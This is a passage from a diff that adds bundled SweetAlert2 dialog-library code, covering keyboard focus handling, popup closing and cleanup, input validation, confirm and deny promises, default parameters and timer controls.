+            }
+            clickConfirm();
+            event.preventDefault();
+          }
+        };
+        const handleTab = (event) => {
+          const targetElement = event.target;
+          const focusableElements = getFocusableElements();
+          let btnIndex = -1;
+          for (let i = 0; i < focusableElements.length; i++) {
+            if (targetElement === focusableElements[i]) {
+              btnIndex = i;
+              break;
+            }
+          }
+          if (!event.shiftKey) {
+            setFocus(btnIndex, 1);
+          } else {
+            setFocus(btnIndex, -1);
+          }
+          event.stopPropagation();
+          event.preventDefault();
+        };
+        const handleArrows = (key) => {
+          const confirmButton = getConfirmButton();
+          const denyButton = getDenyButton();
+          const cancelButton = getCancelButton();
+          if (document.activeElement instanceof HTMLElement && ![confirmButton, denyButton, cancelButton].includes(document.activeElement)) {
+            return;
+          }
+          const sibling = arrowKeysNextButton.includes(key) ? "nextElementSibling" : "previousElementSibling";
+          let buttonToFocus = document.activeElement;
+          for (let i = 0; i < getActions().children.length; i++) {
+            buttonToFocus = buttonToFocus[sibling];
+            if (!buttonToFocus) {
+              return;
+            }
+            if (buttonToFocus instanceof HTMLButtonElement && isVisible$1(buttonToFocus)) {
+              break;
+            }
+          }
+          if (buttonToFocus instanceof HTMLButtonElement) {
+            buttonToFocus.focus();
+          }
+        };
+        const handleEsc = (event, innerParams, dismissWith) => {
+          if (callIfFunction(innerParams.allowEscapeKey)) {
+            event.preventDefault();
+            dismissWith(DismissReason.esc);
+          }
+        };
+        var privateMethods = {
+          swalPromiseResolve: /* @__PURE__ */ new WeakMap(),
+          swalPromiseReject: /* @__PURE__ */ new WeakMap()
+        };
+        const setAriaHidden = () => {
+          const bodyChildren = Array.from(document.body.children);
+          bodyChildren.forEach((el) => {
+            if (el === getContainer() || el.contains(getContainer())) {
+              return;
+            }
+            if (el.hasAttribute("aria-hidden")) {
+              el.setAttribute("data-previous-aria-hidden", el.getAttribute("aria-hidden"));
+            }
+            el.setAttribute("aria-hidden", "true");
+          });
+        };
+        const unsetAriaHidden = () => {
+          const bodyChildren = Array.from(document.body.children);
+          bodyChildren.forEach((el) => {
+            if (el.hasAttribute("data-previous-aria-hidden")) {
+              el.setAttribute("aria-hidden", el.getAttribute("data-previous-aria-hidden"));
+              el.removeAttribute("data-previous-aria-hidden");
+            } else {
+              el.removeAttribute("aria-hidden");
+            }
+          });
+        };
+        const iOSfix = () => {
+          const iOS = (
+            // @ts-ignore
+            /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream || navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1
+          );
+          if (iOS && !hasClass(document.body, swalClasses.iosfix)) {
+            const offset = document.body.scrollTop;
+            document.body.style.top = `${offset * -1}px`;
+            addClass(document.body, swalClasses.iosfix);
+            lockBodyScroll();
+            addBottomPaddingForTallPopups();
+          }
+        };
+        const addBottomPaddingForTallPopups = () => {
+          const ua = navigator.userAgent;
+          const iOS = !!ua.match(/iPad/i) || !!ua.match(/iPhone/i);
+          const webkit = !!ua.match(/WebKit/i);
+          const iOSSafari = iOS && webkit && !ua.match(/CriOS/i);
+          if (iOSSafari) {
+            const bottomPanelHeight = 44;
+            if (getPopup().scrollHeight > window.innerHeight - bottomPanelHeight) {
+              getContainer().style.paddingBottom = `${bottomPanelHeight}px`;
+            }
+          }
+        };
+        const lockBodyScroll = () => {
+          const container = getContainer();
+          let preventTouchMove;
+          container.ontouchstart = (event) => {
+            preventTouchMove = shouldPreventTouchMove(event);
+          };
+          container.ontouchmove = (event) => {
+            if (preventTouchMove) {
+              event.preventDefault();
+              event.stopPropagation();
+            }
+          };
+        };
+        const shouldPreventTouchMove = (event) => {
+          const target = event.target;
+          const container = getContainer();
+          if (isStylus(event) || isZoom(event)) {
+            return false;
+          }
+          if (target === container) {
+            return true;
+          }
+          if (!isScrollable(container) && target instanceof HTMLElement && target.tagName !== "INPUT" && // #1603
+          target.tagName !== "TEXTAREA" && // #2266
+          !(isScrollable(getHtmlContainer()) && // #1944
+          getHtmlContainer().contains(target))) {
+            return true;
+          }
+          return false;
+        };
+        const isStylus = (event) => {
+          return event.touches && event.touches.length && event.touches[0].touchType === "stylus";
+        };
+        const isZoom = (event) => {
+          return event.touches && event.touches.length > 1;
+        };
+        const undoIOSfix = () => {
+          if (hasClass(document.body, swalClasses.iosfix)) {
+            const offset = parseInt(document.body.style.top, 10);
+            removeClass(document.body, swalClasses.iosfix);
+            document.body.style.top = "";
+            document.body.scrollTop = offset * -1;
+          }
+        };
+        const fixScrollbar = () => {
+          if (states2.previousBodyPadding !== null) {
+            return;
+          }
+          if (document.body.scrollHeight > window.innerHeight) {
+            states2.previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right"));
+            document.body.style.paddingRight = `${states2.previousBodyPadding + measureScrollbar()}px`;
+          }
+        };
+        const undoScrollbar = () => {
+          if (states2.previousBodyPadding !== null) {
+            document.body.style.paddingRight = `${states2.previousBodyPadding}px`;
+            states2.previousBodyPadding = null;
+          }
+        };
+        function removePopupAndResetState(instance, container, returnFocus, didClose) {
+          if (isToast()) {
+            triggerDidCloseAndDispose(instance, didClose);
+          } else {
+            restoreActiveElement(returnFocus).then(() => triggerDidCloseAndDispose(instance, didClose));
+            removeKeydownHandler(globalState);
+          }
+          const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+          if (isSafari) {
+            container.setAttribute("style", "display:none !important");
+            container.removeAttribute("class");
+            container.innerHTML = "";
+          } else {
+            container.remove();
+          }
+          if (isModal()) {
+            undoScrollbar();
+            undoIOSfix();
+            unsetAriaHidden();
+          }
+          removeBodyClasses();
+        }
+        function removeBodyClasses() {
+          removeClass([document.documentElement, document.body], [swalClasses.shown, swalClasses["height-auto"], swalClasses["no-backdrop"], swalClasses["toast-shown"]]);
+        }
+        function close(resolveValue) {
+          resolveValue = prepareResolveValue(resolveValue);
+          const swalPromiseResolve = privateMethods.swalPromiseResolve.get(this);
+          const didClose = triggerClosePopup(this);
+          if (this.isAwaitingPromise()) {
+            if (!resolveValue.isDismissed) {
+              handleAwaitingPromise(this);
+              swalPromiseResolve(resolveValue);
+            }
+          } else if (didClose) {
+            swalPromiseResolve(resolveValue);
+          }
+        }
+        function isAwaitingPromise() {
+          return !!privateProps.awaitingPromise.get(this);
+        }
+        const triggerClosePopup = (instance) => {
+          const popup = getPopup();
+          if (!popup) {
+            return false;
+          }
+          const innerParams = privateProps.innerParams.get(instance);
+          if (!innerParams || hasClass(popup, innerParams.hideClass.popup)) {
+            return false;
+          }
+          removeClass(popup, innerParams.showClass.popup);
+          addClass(popup, innerParams.hideClass.popup);
+          const backdrop = getContainer();
+          removeClass(backdrop, innerParams.showClass.backdrop);
+          addClass(backdrop, innerParams.hideClass.backdrop);
+          handlePopupAnimation(instance, popup, innerParams);
+          return true;
+        };
+        function rejectPromise(error2) {
+          const rejectPromise2 = privateMethods.swalPromiseReject.get(this);
+          handleAwaitingPromise(this);
+          if (rejectPromise2) {
+            rejectPromise2(error2);
+          }
+        }
+        const handleAwaitingPromise = (instance) => {
+          if (instance.isAwaitingPromise()) {
+            privateProps.awaitingPromise.delete(instance);
+            if (!privateProps.innerParams.get(instance)) {
+              instance._destroy();
+            }
+          }
+        };
+        const prepareResolveValue = (resolveValue) => {
+          if (typeof resolveValue === "undefined") {
+            return {
+              isConfirmed: false,
+              isDenied: false,
+              isDismissed: true
+            };
+          }
+          return Object.assign({
+            isConfirmed: false,
+            isDenied: false,
+            isDismissed: false
+          }, resolveValue);
+        };
+        const handlePopupAnimation = (instance, popup, innerParams) => {
+          const container = getContainer();
+          const animationIsSupported = animationEndEvent && hasCssAnimation(popup);
+          if (typeof innerParams.willClose === "function") {
+            innerParams.willClose(popup);
+          }
+          if (animationIsSupported) {
+            animatePopup(instance, popup, container, innerParams.returnFocus, innerParams.didClose);
+          } else {
+            removePopupAndResetState(instance, container, innerParams.returnFocus, innerParams.didClose);
+          }
+        };
+        const animatePopup = (instance, popup, container, returnFocus, didClose) => {
+          globalState.swalCloseEventFinishedCallback = removePopupAndResetState.bind(null, instance, container, returnFocus, didClose);
+          popup.addEventListener(animationEndEvent, function(e) {
+            if (e.target === popup) {
+              globalState.swalCloseEventFinishedCallback();
+              delete globalState.swalCloseEventFinishedCallback;
+            }
+          });
+        };
+        const triggerDidCloseAndDispose = (instance, didClose) => {
+          setTimeout(() => {
+            if (typeof didClose === "function") {
+              didClose.bind(instance.params)();
+            }
+            instance._destroy();
+          });
+        };
+        function setButtonsDisabled(instance, buttons, disabled) {
+          const domCache = privateProps.domCache.get(instance);
+          buttons.forEach((button) => {
+            domCache[button].disabled = disabled;
+          });
+        }
+        function setInputDisabled(input, disabled) {
+          if (!input) {
+            return;
+          }
+          if (input.type === "radio") {
+            const radiosContainer = input.parentNode.parentNode;
+            const radios = radiosContainer.querySelectorAll("input");
+            for (let i = 0; i < radios.length; i++) {
+              radios[i].disabled = disabled;
+            }
+          } else {
+            input.disabled = disabled;
+          }
+        }
+        function enableButtons() {
+          setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], false);
+        }
+        function disableButtons() {
+          setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], true);
+        }
+        function enableInput() {
+          setInputDisabled(this.getInput(), false);
+        }
+        function disableInput() {
+          setInputDisabled(this.getInput(), true);
+        }
+        function showValidationMessage(error2) {
+          const domCache = privateProps.domCache.get(this);
+          const params = privateProps.innerParams.get(this);
+          setInnerHtml(domCache.validationMessage, error2);
+          domCache.validationMessage.className = swalClasses["validation-message"];
+          if (params.customClass && params.customClass.validationMessage) {
+            addClass(domCache.validationMessage, params.customClass.validationMessage);
+          }
+          show(domCache.validationMessage);
+          const input = this.getInput();
+          if (input) {
+            input.setAttribute("aria-invalid", true);
+            input.setAttribute("aria-describedby", swalClasses["validation-message"]);
+            focusInput(input);
+            addClass(input, swalClasses.inputerror);
+          }
+        }
+        function resetValidationMessage() {
+          const domCache = privateProps.domCache.get(this);
+          if (domCache.validationMessage) {
+            hide(domCache.validationMessage);
+          }
+          const input = this.getInput();
+          if (input) {
+            input.removeAttribute("aria-invalid");
+            input.removeAttribute("aria-describedby");
+            removeClass(input, swalClasses.inputerror);
+          }
+        }
+        const defaultParams = {
+          title: "",
+          titleText: "",
+          text: "",
+          html: "",
+          footer: "",
+          icon: void 0,
+          iconColor: void 0,
+          iconHtml: void 0,
+          template: void 0,
+          toast: false,
+          showClass: {
+            popup: "swal2-show",
+            backdrop: "swal2-backdrop-show",
+            icon: "swal2-icon-show"
+          },
+          hideClass: {
+            popup: "swal2-hide",
+            backdrop: "swal2-backdrop-hide",
+            icon: "swal2-icon-hide"
+          },
+          customClass: {},
+          target: "body",
+          color: void 0,
+          backdrop: true,
+          heightAuto: true,
+          allowOutsideClick: true,
+          allowEscapeKey: true,
+          allowEnterKey: true,
+          stopKeydownPropagation: true,
+          keydownListenerCapture: false,
+          showConfirmButton: true,
+          showDenyButton: false,
+          showCancelButton: false,
+          preConfirm: void 0,
+          preDeny: void 0,
+          confirmButtonText: "OK",
+          confirmButtonAriaLabel: "",
+          confirmButtonColor: void 0,
+          denyButtonText: "No",
+          denyButtonAriaLabel: "",
+          denyButtonColor: void 0,
+          cancelButtonText: "Cancel",
+          cancelButtonAriaLabel: "",
+          cancelButtonColor: void 0,
+          buttonsStyling: true,
+          reverseButtons: false,
+          focusConfirm: true,
+          focusDeny: false,
+          focusCancel: false,
+          returnFocus: true,
+          showCloseButton: false,
+          closeButtonHtml: "&times;",
+          closeButtonAriaLabel: "Close this dialog",
+          loaderHtml: "",
+          showLoaderOnConfirm: false,
+          showLoaderOnDeny: false,
+          imageUrl: void 0,
+          imageWidth: void 0,
+          imageHeight: void 0,
+          imageAlt: "",
+          timer: void 0,
+          timerProgressBar: false,
+          width: void 0,
+          padding: void 0,
+          background: void 0,
+          input: void 0,
+          inputPlaceholder: "",
+          inputLabel: "",
+          inputValue: "",
+          inputOptions: {},
+          inputAutoTrim: true,
+          inputAttributes: {},
+          inputValidator: void 0,
+          returnInputValueOnDeny: false,
+          validationMessage: void 0,
+          grow: false,
+          position: "center",
+          progressSteps: [],
+          currentProgressStep: void 0,
+          progressStepsDistance: void 0,
+          willOpen: void 0,
+          didOpen: void 0,
+          didRender: void 0,
+          willClose: void 0,
+          didClose: void 0,
+          didDestroy: void 0,
+          scrollbarPadding: true
+        };
+        const updatableParams = ["allowEscapeKey", "allowOutsideClick", "background", "buttonsStyling", "cancelButtonAriaLabel", "cancelButtonColor", "cancelButtonText", "closeButtonAriaLabel", "closeButtonHtml", "color", "confirmButtonAriaLabel", "confirmButtonColor", "confirmButtonText", "currentProgressStep", "customClass", "denyButtonAriaLabel", "denyButtonColor", "denyButtonText", "didClose", "didDestroy", "footer", "hideClass", "html", "icon", "iconColor", "iconHtml", "imageAlt", "imageHeight", "imageUrl", "imageWidth", "preConfirm", "preDeny", "progressSteps", "returnFocus", "reverseButtons", "showCancelButton", "showCloseButton", "showConfirmButton", "showDenyButton", "text", "title", "titleText", "willClose"];
+        const deprecatedParams = {};
+        const toastIncompatibleParams = ["allowOutsideClick", "allowEnterKey", "backdrop", "focusConfirm", "focusDeny", "focusCancel", "returnFocus", "heightAuto", "keydownListenerCapture"];
+        const isValidParameter = (paramName) => {
+          return Object.prototype.hasOwnProperty.call(defaultParams, paramName);
+        };
+        const isUpdatableParameter = (paramName) => {
+          return updatableParams.indexOf(paramName) !== -1;
+        };
+        const isDeprecatedParameter = (paramName) => {
+          return deprecatedParams[paramName];
+        };
+        const checkIfParamIsValid = (param) => {
+          if (!isValidParameter(param)) {
+            warn(`Unknown parameter "${param}"`);
+          }
+        };
+        const checkIfToastParamIsValid = (param) => {
+          if (toastIncompatibleParams.includes(param)) {
+            warn(`The parameter "${param}" is incompatible with toasts`);
+          }
+        };
+        const checkIfParamIsDeprecated = (param) => {
+          if (isDeprecatedParameter(param)) {
+            warnAboutDeprecation(param, isDeprecatedParameter(param));
+          }
+        };
+        const showWarningsForParams = (params) => {
+          if (params.backdrop === false && params.allowOutsideClick) {
+            warn('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');
+          }
+          for (const param in params) {
+            checkIfParamIsValid(param);
+            if (params.toast) {
+              checkIfToastParamIsValid(param);
+            }
+            checkIfParamIsDeprecated(param);
+          }
+        };
+        function update(params) {
+          const popup = getPopup();
+          const innerParams = privateProps.innerParams.get(this);
+          if (!popup || hasClass(popup, innerParams.hideClass.popup)) {
+            warn(`You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.`);
+            return;
+          }
+          const validUpdatableParams = filterValidParams(params);
+          const updatedParams = Object.assign({}, innerParams, validUpdatableParams);
+          render(this, updatedParams);
+          privateProps.innerParams.set(this, updatedParams);
+          Object.defineProperties(this, {
+            params: {
+              value: Object.assign({}, this.params, params),
+              writable: false,
+              enumerable: true
+            }
+          });
+        }
+        const filterValidParams = (params) => {
+          const validUpdatableParams = {};
+          Object.keys(params).forEach((param) => {
+            if (isUpdatableParameter(param)) {
+              validUpdatableParams[param] = params[param];
+            } else {
+              warn(`Invalid parameter to update: ${param}`);
+            }
+          });
+          return validUpdatableParams;
+        };
+        function _destroy() {
+          const domCache = privateProps.domCache.get(this);
+          const innerParams = privateProps.innerParams.get(this);
+          if (!innerParams) {
+            disposeWeakMaps(this);
+            return;
+          }
+          if (domCache.popup && globalState.swalCloseEventFinishedCallback) {
+            globalState.swalCloseEventFinishedCallback();
+            delete globalState.swalCloseEventFinishedCallback;
+          }
+          if (typeof innerParams.didDestroy === "function") {
+            innerParams.didDestroy();
+          }
+          disposeSwal(this);
+        }
+        const disposeSwal = (instance) => {
+          disposeWeakMaps(instance);
+          delete instance.params;
+          delete globalState.keydownHandler;
+          delete globalState.keydownTarget;
+          delete globalState.currentInstance;
+        };
+        const disposeWeakMaps = (instance) => {
+          if (instance.isAwaitingPromise()) {
+            unsetWeakMaps(privateProps, instance);
+            privateProps.awaitingPromise.set(instance, true);
+          } else {
+            unsetWeakMaps(privateMethods, instance);
+            unsetWeakMaps(privateProps, instance);
+          }
+        };
+        const unsetWeakMaps = (obj, instance) => {
+          for (const i in obj) {
+            obj[i].delete(instance);
+          }
+        };
+        var instanceMethods = /* @__PURE__ */ Object.freeze({
+          __proto__: null,
+          hideLoading,
+          disableLoading: hideLoading,
+          getInput,
+          close,
+          isAwaitingPromise,
+          rejectPromise,
+          handleAwaitingPromise,
+          closePopup: close,
+          closeModal: close,
+          closeToast: close,
+          enableButtons,
+          disableButtons,
+          enableInput,
+          disableInput,
+          showValidationMessage,
+          resetValidationMessage,
+          update,
+          _destroy
+        });
+        const showLoading = (buttonToReplace) => {
+          let popup = getPopup();
+          if (!popup) {
+            new Swal6();
+          }
+          popup = getPopup();
+          const loader = getLoader();
+          if (isToast()) {
+            hide(getIcon());
+          } else {
+            replaceButton(popup, buttonToReplace);
+          }
+          show(loader);
+          popup.setAttribute("data-loading", "true");
+          popup.setAttribute("aria-busy", "true");
+          popup.focus();
+        };
+        const replaceButton = (popup, buttonToReplace) => {
+          const actions = getActions();
+          const loader = getLoader();
+          if (!buttonToReplace && isVisible$1(getConfirmButton())) {
+            buttonToReplace = getConfirmButton();
+          }
+          show(actions);
+          if (buttonToReplace) {
+            hide(buttonToReplace);
+            loader.setAttribute("data-button-to-replace", buttonToReplace.className);
+          }
+          loader.parentNode.insertBefore(loader, buttonToReplace);
+          addClass([popup, actions], swalClasses.loading);
+        };
+        const handleInputOptionsAndValue = (instance, params) => {
+          if (params.input === "select" || params.input === "radio") {
+            handleInputOptions(instance, params);
+          } else if (["text", "email", "number", "tel", "textarea"].includes(params.input) && (hasToPromiseFn(params.inputValue) || isPromise(params.inputValue))) {
+            showLoading(getConfirmButton());
+            handleInputValue(instance, params);
+          }
+        };
+        const getInputValue = (instance, innerParams) => {
+          const input = instance.getInput();
+          if (!input) {
+            return null;
+          }
+          switch (innerParams.input) {
+            case "checkbox":
+              return getCheckboxValue(input);
+            case "radio":
+              return getRadioValue(input);
+            case "file":
+              return getFileValue(input);
+            default:
+              return innerParams.inputAutoTrim ? input.value.trim() : input.value;
+          }
+        };
+        const getCheckboxValue = (input) => input.checked ? 1 : 0;
+        const getRadioValue = (input) => input.checked ? input.value : null;
+        const getFileValue = (input) => input.files.length ? input.getAttribute("multiple") !== null ? input.files : input.files[0] : null;
+        const handleInputOptions = (instance, params) => {
+          const popup = getPopup();
+          const processInputOptions = (inputOptions) => {
+            populateInputOptions[params.input](popup, formatInputOptions(inputOptions), params);
+          };
+          if (hasToPromiseFn(params.inputOptions) || isPromise(params.inputOptions)) {
+            showLoading(getConfirmButton());
+            asPromise(params.inputOptions).then((inputOptions) => {
+              instance.hideLoading();
+              processInputOptions(inputOptions);
+            });
+          } else if (typeof params.inputOptions === "object") {
+            processInputOptions(params.inputOptions);
+          } else {
+            error(`Unexpected type of inputOptions! Expected object, Map or Promise, got ${typeof params.inputOptions}`);
+          }
+        };
+        const handleInputValue = (instance, params) => {
+          const input = instance.getInput();
+          hide(input);
+          asPromise(params.inputValue).then((inputValue) => {
+            input.value = params.input === "number" ? `${parseFloat(inputValue) || 0}` : `${inputValue}`;
+            show(input);
+            input.focus();
+            instance.hideLoading();
+          }).catch((err) => {
+            error(`Error in inputValue promise: ${err}`);
+            input.value = "";
+            show(input);
+            input.focus();
+            instance.hideLoading();
+          });
+        };
+        const populateInputOptions = {
+          /**
+           * @param {HTMLElement} popup
+           * @param {Record<string, any>} inputOptions
+           * @param {SweetAlertOptions} params
+           */
+          select: (popup, inputOptions, params) => {
+            const select = getDirectChildByClass(popup, swalClasses.select);
+            const renderOption = (parent, optionLabel, optionValue) => {
+              const option = document.createElement("option");
+              option.value = optionValue;
+              setInnerHtml(option, optionLabel);
+              option.selected = isSelected(optionValue, params.inputValue);
+              parent.appendChild(option);
+            };
+            inputOptions.forEach((inputOption) => {
+              const optionValue = inputOption[0];
+              const optionLabel = inputOption[1];
+              if (Array.isArray(optionLabel)) {
+                const optgroup = document.createElement("optgroup");
+                optgroup.label = optionValue;
+                optgroup.disabled = false;
+                select.appendChild(optgroup);
+                optionLabel.forEach((o) => renderOption(optgroup, o[1], o[0]));
+              } else {
+                renderOption(select, optionLabel, optionValue);
+              }
+            });
+            select.focus();
+          },
+          /**
+           * @param {HTMLElement} popup
+           * @param {Record<string, any>} inputOptions
+           * @param {SweetAlertOptions} params
+           */
+          radio: (popup, inputOptions, params) => {
+            const radio = getDirectChildByClass(popup, swalClasses.radio);
+            inputOptions.forEach((inputOption) => {
+              const radioValue = inputOption[0];
+              const radioLabel = inputOption[1];
+              const radioInput = document.createElement("input");
+              const radioLabelElement = document.createElement("label");
+              radioInput.type = "radio";
+              radioInput.name = swalClasses.radio;
+              radioInput.value = radioValue;
+              if (isSelected(radioValue, params.inputValue)) {
+                radioInput.checked = true;
+              }
+              const label = document.createElement("span");
+              setInnerHtml(label, radioLabel);
+              label.className = swalClasses.label;
+              radioLabelElement.appendChild(radioInput);
+              radioLabelElement.appendChild(label);
+              radio.appendChild(radioLabelElement);
+            });
+            const radios = radio.querySelectorAll("input");
+            if (radios.length) {
+              radios[0].focus();
+            }
+          }
+        };
+        const formatInputOptions = (inputOptions) => {
+          const result = [];
+          if (typeof Map !== "undefined" && inputOptions instanceof Map) {
+            inputOptions.forEach((value, key) => {
+              let valueFormatted = value;
+              if (typeof valueFormatted === "object") {
+                valueFormatted = formatInputOptions(valueFormatted);
+              }
+              result.push([key, valueFormatted]);
+            });
+          } else {
+            Object.keys(inputOptions).forEach((key) => {
+              let valueFormatted = inputOptions[key];
+              if (typeof valueFormatted === "object") {
+                valueFormatted = formatInputOptions(valueFormatted);
+              }
+              result.push([key, valueFormatted]);
+            });
+          }
+          return result;
+        };
+        const isSelected = (optionValue, inputValue) => {
+          return inputValue && inputValue.toString() === optionValue.toString();
+        };
+        const handleConfirmButtonClick = (instance) => {
+          const innerParams = privateProps.innerParams.get(instance);
+          instance.disableButtons();
+          if (innerParams.input) {
+            handleConfirmOrDenyWithInput(instance, "confirm");
+          } else {
+            confirm(instance, true);
+          }
+        };
+        const handleDenyButtonClick = (instance) => {
+          const innerParams = privateProps.innerParams.get(instance);
+          instance.disableButtons();
+          if (innerParams.returnInputValueOnDeny) {
+            handleConfirmOrDenyWithInput(instance, "deny");
+          } else {
+            deny(instance, false);
+          }
+        };
+        const handleCancelButtonClick = (instance, dismissWith) => {
+          instance.disableButtons();
+          dismissWith(DismissReason.cancel);
+        };
+        const handleConfirmOrDenyWithInput = (instance, type) => {
+          const innerParams = privateProps.innerParams.get(instance);
+          if (!innerParams.input) {
+            error(`The "input" parameter is needed to be set when using returnInputValueOn${capitalizeFirstLetter(type)}`);
+            return;
+          }
+          const inputValue = getInputValue(instance, innerParams);
+          if (innerParams.inputValidator) {
+            handleInputValidator(instance, inputValue, type);
+          } else if (!instance.getInput().checkValidity()) {
+            instance.enableButtons();
+            instance.showValidationMessage(innerParams.validationMessage);
+          } else if (type === "deny") {
+            deny(instance, inputValue);
+          } else {
+            confirm(instance, inputValue);
+          }
+        };
+        const handleInputValidator = (instance, inputValue, type) => {
+          const innerParams = privateProps.innerParams.get(instance);
+          instance.disableInput();
+          const validationPromise = Promise.resolve().then(() => asPromise(innerParams.inputValidator(inputValue, innerParams.validationMessage)));
+          validationPromise.then((validationMessage) => {
+            instance.enableButtons();
+            instance.enableInput();
+            if (validationMessage) {
+              instance.showValidationMessage(validationMessage);
+            } else if (type === "deny") {
+              deny(instance, inputValue);
+            } else {
+              confirm(instance, inputValue);
+            }
+          });
+        };
+        const deny = (instance, value) => {
+          const innerParams = privateProps.innerParams.get(instance || void 0);
+          if (innerParams.showLoaderOnDeny) {
+            showLoading(getDenyButton());
+          }
+          if (innerParams.preDeny) {
+            privateProps.awaitingPromise.set(instance || void 0, true);
+            const preDenyPromise = Promise.resolve().then(() => asPromise(innerParams.preDeny(value, innerParams.validationMessage)));
+            preDenyPromise.then((preDenyValue) => {
+              if (preDenyValue === false) {
+                instance.hideLoading();
+                handleAwaitingPromise(instance);
+              } else {
+                instance.close({
+                  isDenied: true,
+                  value: typeof preDenyValue === "undefined" ? value : preDenyValue
+                });
+              }
+            }).catch((error2) => rejectWith(instance || void 0, error2));
+          } else {
+            instance.close({
+              isDenied: true,
+              value
+            });
+          }
+        };
+        const succeedWith = (instance, value) => {
+          instance.close({
+            isConfirmed: true,
+            value
+          });
+        };
+        const rejectWith = (instance, error2) => {
+          instance.rejectPromise(error2);
+        };
+        const confirm = (instance, value) => {
+          const innerParams = privateProps.innerParams.get(instance || void 0);
+          if (innerParams.showLoaderOnConfirm) {
+            showLoading();
+          }
+          if (innerParams.preConfirm) {
+            instance.resetValidationMessage();
+            privateProps.awaitingPromise.set(instance || void 0, true);
+            const preConfirmPromise = Promise.resolve().then(() => asPromise(innerParams.preConfirm(value, innerParams.validationMessage)));
+            preConfirmPromise.then((preConfirmValue) => {
+              if (isVisible$1(getValidationMessage()) || preConfirmValue === false) {
+                instance.hideLoading();
+                handleAwaitingPromise(instance);
+              } else {
+                succeedWith(instance, typeof preConfirmValue === "undefined" ? value : preConfirmValue);
+              }
+            }).catch((error2) => rejectWith(instance || void 0, error2));
+          } else {
+            succeedWith(instance, value);
+          }
+        };
+        const handlePopupClick = (instance, domCache, dismissWith) => {
+          const innerParams = privateProps.innerParams.get(instance);
+          if (innerParams.toast) {
+            handleToastClick(instance, domCache, dismissWith);
+          } else {
+            handleModalMousedown(domCache);
+            handleContainerMousedown(domCache);
+            handleModalClick(instance, domCache, dismissWith);
+          }
+        };
+        const handleToastClick = (instance, domCache, dismissWith) => {
+          domCache.popup.onclick = () => {
+            const innerParams = privateProps.innerParams.get(instance);
+            if (innerParams && (isAnyButtonShown(innerParams) || innerParams.timer || innerParams.input)) {
+              return;
+            }
+            dismissWith(DismissReason.close);
+          };
+        };
+        const isAnyButtonShown = (innerParams) => {
+          return innerParams.showConfirmButton || innerParams.showDenyButton || innerParams.showCancelButton || innerParams.showCloseButton;
+        };
+        let ignoreOutsideClick = false;
+        const handleModalMousedown = (domCache) => {
+          domCache.popup.onmousedown = () => {
+            domCache.container.onmouseup = function(e) {
+              domCache.container.onmouseup = void 0;
+              if (e.target === domCache.container) {
+                ignoreOutsideClick = true;
+              }
+            };
+          };
+        };
+        const handleContainerMousedown = (domCache) => {
+          domCache.container.onmousedown = () => {
+            domCache.popup.onmouseup = function(e) {
+              domCache.popup.onmouseup = void 0;
+              if (e.target === domCache.popup || domCache.popup.contains(e.target)) {
+                ignoreOutsideClick = true;
+              }
+            };
+          };
+        };
+        const handleModalClick = (instance, domCache, dismissWith) => {
+          domCache.container.onclick = (e) => {
+            const innerParams = privateProps.innerParams.get(instance);
+            if (ignoreOutsideClick) {
+              ignoreOutsideClick = false;
+              return;
+            }
+            if (e.target === domCache.container && callIfFunction(innerParams.allowOutsideClick)) {
+              dismissWith(DismissReason.backdrop);
+            }
+          };
+        };
+        const isJqueryElement = (elem) => typeof elem === "object" && elem.jquery;
+        const isElement = (elem) => elem instanceof Element || isJqueryElement(elem);
+        const argsToParams = (args) => {
+          const params = {};
+          if (typeof args[0] === "object" && !isElement(args[0])) {
+            Object.assign(params, args[0]);
+          } else {
+            ["title", "html", "icon"].forEach((name, index) => {
+              const arg = args[index];
+              if (typeof arg === "string" || isElement(arg)) {
+                params[name] = arg;
+              } else if (arg !== void 0) {
+                error(`Unexpected type of ${name}! Expected "string" or "Element", got ${typeof arg}`);
+              }
+            });
+          }
+          return params;
+        };
+        function fire() {
+          const Swal7 = this;
+          for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
+            args[_key] = arguments[_key];
+          }
+          return new Swal7(...args);
+        }
+        function mixin(mixinParams) {
+          class MixinSwal extends this {
+            _main(params, priorityMixinParams) {
+              return super._main(params, Object.assign({}, mixinParams, priorityMixinParams));
+            }
+          }
+          return MixinSwal;
+        }
+        const getTimerLeft = () => {
+          return globalState.timeout && globalState.timeout.getTimerLeft();
+        };
+        const stopTimer = () => {
+          if (globalState.timeout) {
+            stopTimerProgressBar();
+            return globalState.timeout.stop();
+          }
+        };
+        const resumeTimer = () => {
+          if (globalState.timeout) {
+            const remaining = globalState.timeout.start();
+            animateTimerProgressBar(remaining);
+            return remaining;
+          }
+        };
+        const toggleTimer = () => {
+          const timer = globalState.timeout;
+          return timer && (timer.running ? stopTimer() : resumeTimer());
+        };
+        const increaseTimer = (n) => {
+          if (globalState.timeout) {
+            const remaining = globalState.timeout.increase(n);
+            animateTimerProgressBar(remaining, true);
+            return remaining;
+          }
+        };
+        const isTimerRunning = () => {
+          return globalState.timeout && globalState.timeout.isRunning();
+        };
+        let bodyClickListenerAdded = false;
+        const clickHandlers = {};
+        function bindClickHandler() {
+          let attr = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "data-swal-template";
+          clickHandlers[attr] = this;
+          if (!bodyClickListenerAdded) {
+            document.body.addEventListener("click", bodyClickListener);
+            bodyClickListenerAdded = true;
+          }
+        }
+        const bodyClickListener = (event) => {
+          for (let el = event.target; el && el !== document; el = el.parentNode) {
+            for (const attr in clickHandlers) {
+              const template = el.getAttribute(attr);
+              if (template) {
+                clickHandlers[attr].fire({
+                  template
+                });
+                return;
+              }
+            }
+          }
+        };
+        var staticMethods = /* @__PURE__ */ Object.freeze({
+          __proto__: null,
+          isValidParameter,
+          isUpdatableParameter,
+          isDeprecatedParameter,
+          argsToParams,
+          getContainer,
+          getPopup,
+          getTitle,
+          getHtmlContainer,
+          getImage,
+          getIcon,
+          getIconContent,
+          getInputLabel,
+          getCloseButton,
+          getActions,
+          getConfirmButton,
+          getDenyButton,
+          getCancelButton,
+          getLoader,
+          getFooter,
+          getTimerProgressBar,
+          getFocusableElements,
